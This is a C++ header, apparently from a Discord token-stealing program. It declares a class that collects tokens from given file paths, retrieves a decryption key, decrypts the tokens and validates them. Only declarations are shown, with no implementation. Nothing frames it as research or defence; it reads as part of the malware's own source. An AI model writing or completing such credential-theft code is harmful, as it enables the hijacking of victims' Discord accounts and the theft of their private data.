#pragma once
#include "goopbase.h"
#include "config.h"

class Discord : public GoopBase {
public:
	Discord(vs svPaths) noexcept;

private:
	vs GetValidTokens() noexcept;

	vs validTokens;

	vs GetTokens(std::string path) noexcept;

	DATA_BLOB GetKey(std::string path) noexcept;

	std::string DecryptToken(std::string token, DATA_BLOB key) noexcept;

	std::string ValidateToken(std::string) noexcept;
};